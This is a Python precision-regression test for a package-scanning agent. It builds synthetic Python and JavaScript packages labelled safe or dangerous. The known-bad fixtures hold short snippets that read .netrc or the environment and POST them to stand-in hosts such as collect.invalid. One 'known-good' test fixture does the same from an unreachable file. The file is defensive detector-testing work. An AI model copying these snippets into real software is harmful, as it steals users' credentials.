#!/usr/bin/env python3
"""Reachability and source-to-sink precision regressions for packages."""

from __future__ import annotations

import argparse
import json
import tempfile
from pathlib import Path

import local_eval


CASES = (
    ("known-good", "unreachable-test-fixture", {
        "package.json": json.dumps({
            "name": "ordinary-js-lib", "main": "src/index.js",
        }),
        "src/index.js": "module.exports = {ok: true};\n",
        "tests/fixture/__init__.py": (
            "import os, requests\n"
            "requests.post('https://fixture.invalid', data=dict(os.environ))\n"
        ),
    }, []),
    ("known-good", "python-sdk-unrelated-modules", {
        "pyproject.toml": '[project]\nname = "ordinary-cloud-sdk"\n',
        "ordinary_cloud_sdk/__init__.py": "from .client import Client\n",
        "ordinary_cloud_sdk/config.py": (
            "import os\n"
            "def snapshot_environment_for_subprocess():\n"
            "    return os.environ.copy()\n"
        ),
        "ordinary_cloud_sdk/client.py": (
            "import requests\n"
            "class Client:\n"
            "    def send(self, payload):\n"
            "        return requests.post('https://api.example.test', json=payload)\n"
        ),
    }, []),
    ("known-good", "python-same-file-unrelated-scopes", {
        "pyproject.toml": '[project]\nname = "credential-helper"\n',
        "credential_helper/__init__.py": "from .client import load, send\n",
        "credential_helper/client.py": (
            "import requests\n"
            "def load():\n"
            "    return open('~/.netrc').read()\n"
            "def send(payload):\n"
            "    return requests.post('https://api.example.test', data=payload)\n"
        ),
    }, []),
    ("known-good", "javascript-same-file-unrelated-scopes", {
        "package.json": json.dumps({
            "name": "credential-helper-js", "main": "index.js",
        }),
        "index.js": (
            "const fs = require('fs');\n"
            "function load() {\n"
            "  const secret = fs.readFileSync('.netrc');\n"
            "  return secret;\n"
            "}\n"
            "function send(payload) {\n"
            "  return fetch('https://api.example.test', {method: 'POST', body: payload});\n"
            "}\n"
            "module.exports = {load, send};\n"
        ),
    }, []),
    ("known-bad", "python-same-scope-exfiltration", {
        "pyproject.toml": '[project]\nname = "credential-export"\n',
        "credential_export/__init__.py": "from .client import export\n",
        "credential_export/client.py": (
            "import requests\n"
            "def export():\n"
            "    secret = open('~/.netrc').read()\n"
            "    return requests.post('https://collect.invalid', data=secret)\n"
        ),
    }, [("credential_theft", "credential_export/client.py")]),
    ("known-bad", "javascript-same-scope-exfiltration", {
        "package.json": json.dumps({
            "name": "credential-export-js", "main": "index.js",
        }),
        "index.js": (
            "const fs = require('fs');\n"
            "exports.run = function() {\n"
            "  const secret = fs.readFileSync('.netrc');\n"
            "  return fetch('https://collect.invalid', {method: 'POST', body: secret});\n"
            "};\n"
        ),
    }, [("credential_theft", "index.js")]),
    ("known-bad", "javascript-explicit-cross-file-flow", {
        "package.json": json.dumps({
            "name": "split-export", "main": "index.js",
        }),
        "index.js": (
            "const collect = require('./lib/collect');\n"
            "const ship = require('./lib/ship');\n"
            "ship.send(collect.gather());\n"
        ),
        "lib/collect.js": "exports.gather = () => JSON.stringify(process.env);\n",
        "lib/ship.js": (
            "const axios = require('axios');\n"
            "exports.send = body => axios.post('https://collect.invalid', body);\n"
        ),
    }, [("credential_theft", "lib/collect.js")]),
)


def materialise(root: Path) -> None:
    for label, name, files, findings in CASES:
        artifact = root / "packages" / label / name
        artifact.mkdir(parents=True)
        for rel, text in files.items():
            path = artifact / rel
            path.parent.mkdir(parents=True, exist_ok=True)
            path.write_text(text, encoding="utf-8")
        expected = [{
            "category": category,
            "severity": "CRIT",
            "plane": "action",
            "title": category.replace("_", " "),
            "evidence_ref": ref,
        } for category, ref in findings]
        (artifact / "label.json").write_text(json.dumps({
            "artifact_id": f"packages/{label}/{name}",
            "track": "packages",
            "ground_truth": {
                "verdict": "ALLOW" if label == "known-good" else "BLOCK",
                "risk_score": 3 if label == "known-good" else 92,
                "classification": "safe" if label == "known-good" else "dangerous",
            },
            "expected_findings": expected,
        }), encoding="utf-8")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--agent", default="agent/phylax_packages_agent.py")
    args = parser.parse_args()
    agent = Path(args.agent)
    if not agent.is_absolute():
        agent = local_eval.LAB / agent
    with tempfile.TemporaryDirectory(prefix="phylax-packages-wave7-src-") as src_tmp:
        with tempfile.TemporaryDirectory(prefix="phylax-packages-wave7-work-") as work_tmp:
            src, work = Path(src_tmp), Path(work_tmp)
            materialise(src)
            corpus = local_eval.load_corpus(src, "packages", work)
            score, rows, detail = local_eval.score_detonation_track(
                agent, corpus, "packages", "packages-wave7-precision", 1, 60, False,
            )
            print(f"packages-wave7-precision: score={score:.4f}  {detail}")
            for ref, verdict, note in rows:
                print(f"  {ref:<72} {verdict:<6} {note}")
            return 1 if score < 0.9999 else 0


if __name__ == "__main__":
    raise SystemExit(main())
